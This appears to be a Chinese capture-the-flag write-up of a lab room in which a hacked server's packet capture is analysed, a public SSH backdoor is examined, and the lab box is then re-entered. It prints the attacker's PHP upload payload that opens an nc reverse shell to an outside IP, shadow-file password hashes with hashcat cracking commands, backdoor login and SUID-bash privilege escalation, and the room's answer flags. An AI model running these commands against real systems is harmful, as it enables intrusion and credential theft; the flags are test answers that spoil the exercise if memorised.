立交桥被黑了！SOC团队（Paradox，祝贺晋升）在查看 shibes 时注意到一个深夜班的可疑活动，并在攻击发生时设法捕获数据包。

你能弄清楚攻击者是如何进入的，然后黑进 Overpass 的生产服务器吗？

# 一.分析PACP

追踪第一个http流，发现针对/development页面的get请求

![1683798916_645cbb84aa87c540f8c65.png!small](https://image.3001.net/images/20230511/1683798916_645cbb84aa87c540f8c65.png!small)

继续查找发现存在对/development/upload.php的请求

![1683798930_645cbb92b8d711ca49184.png!small](https://image.3001.net/images/20230511/1683798930_645cbb92b8d711ca49184.png!small)

发现上传了php木马，使用nc反弹shell

![1683798937_645cbb99ae1c7e1a4f482.png!small](https://image.3001.net/images/20230511/1683798937_645cbb99ae1c7e1a4f482.png!small)

攻击者获取shell后获得的权限是www-data权限，通过su命令切换到james用户。

![1683798947_645cbba392eb8986d6fe2.png!small](https://image.3001.net/images/20230511/1683798947_645cbba392eb8986d6fe2.png!small)

攻击者克隆了一个https://github.com/NinjaJc01/ssh-backdoor实现持久化

![1683798959_645cbbafe06a2a169f0bd.png!small](https://image.3001.net/images/20230511/1683798959_645cbbafe06a2a169f0bd.png!small)

攻击者执行cat /etc/shadow,获取了账号和密码hash

![1683798969_645cbbb94add99c16f2fa.png!small](https://image.3001.net/images/20230511/1683798969_645cbbb94add99c16f2fa.png!small)

使用fasttrack wordlist进行爆破，在这里我使用hashcat

将一下sha512的hash值保存成一个文件hash

$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/

$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0

$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/

$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0

$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.

进行爆破

hashcat -m 1800 -a 0 hash /usr/share/wordlists/fasttrack.txt

爆破出4个密码

![1683798987_645cbbcba909a8a59f8a7.png!small](https://image.3001.net/images/20230511/1683798987_645cbbcba909a8a59f8a7.png!small)

1.他们用来上传反向 shell 的页面的 URL 是什么？

/development/

2.攻击者使用什么负载来获取访问权限？

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
192.168.170.145 4242 >/tmp/f")?>

3.攻击者使用什么密码进行privesc？

whenevernoteartinstant

4.攻击者如何建立持久性？

<https://github.com/NinjaJc01/ssh-backdoor>

5.使用 fasttrack wordlist，有多少系统密码是可破解的？

4

# 二.分析代码

访问https://github.com/NinjaJc01/ssh-backdoor库

![1683798998_645cbbd6bce47e2aecf13.png!small](https://image.3001.net/images/20230511/1683798998_645cbbd6bce47e2aecf13.png!small)

在main.go文件中发现后门默认hash值和硬编码盐

![1683799005_645cbbdde7becae498c76.png!small](https://image.3001.net/images/20230511/1683799005_645cbbdde7becae498c76.png!small)

![1683799010_645cbbe217dcbcbd678bb.png!small](https://image.3001.net/images/20230511/1683799010_645cbbe217dcbcbd678bb.png!small)

在pacap中发现攻击者修改了默认hash

![1683799026_645cbbf226cc136baedfa.png!small](https://image.3001.net/images/20230511/1683799026_645cbbf226cc136baedfa.png!small)

对该hash值进行爆破，使用hashcat

将hash和salt保存为一个文件hash2

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05

进行爆破

hashcat -m 1710 -a 0 hash2 /usr/share/wordlists/rockyou.txt

获取到密码

![1683799033_645cbbf947d49d5d6585a.png!small](https://image.3001.net/images/20230511/1683799033_645cbbf947d49d5d6585a.png!small)

1.后门的默认哈希值是多少？

bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3

2.后门的硬编码盐是什么？

1c362db832f3f864c8c2fe05f2002a05

3.攻击者使用的哈希是什么？- 为此返回 PCAP！

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

4.使用 rockyou 和您选择的破解工具破解哈希。密码是什么？

november16

# 三、攻击

攻击留下了标题

![1683799053_645cbc0d778d54902f2fb.png!small](https://image.3001.net/images/20230511/1683799053_645cbc0d778d54902f2fb.png!small)  
nmap -sV -sC 10.10.79.5

![1683799063_645cbc178eb6a5d58c684.png!small](https://image.3001.net/images/20230511/1683799063_645cbc178eb6a5d58c684.png!small)

端口2222已打开，使用上面爆破的密码连接

ssh -oHostKeyAlgorithms=+ssh-rsa james@10.10.79.5 -p 2222

权限提升

find / -user root -perm -4000 -printev/null

![1683799071_645cbc1f4bceac278c3b5.png!small](https://image.3001.net/images/20230511/1683799071_645cbc1f4bceac278c3b5.png!small)

![1683799094_645cbc36589caad312e38.png!small](https://image.3001.net/images/20230511/1683799094_645cbc36589caad312e38.png!small)

./.suid_bash -p

![1683799099_645cbc3bea40acf749af8.png!small](https://image.3001.net/images/20230511/1683799099_645cbc3bea40acf749af8.png!small)

1.攻击者破坏了网站。他们留下了什么消息作为标题？

H4ck3d by CooctusClan

2.什么是用户标志？

thm{d119b4fa8c497ddb0525f7ad200e6567}

3.什么是根标志？

thm{d53b2684f169360bb9606c333873144d}

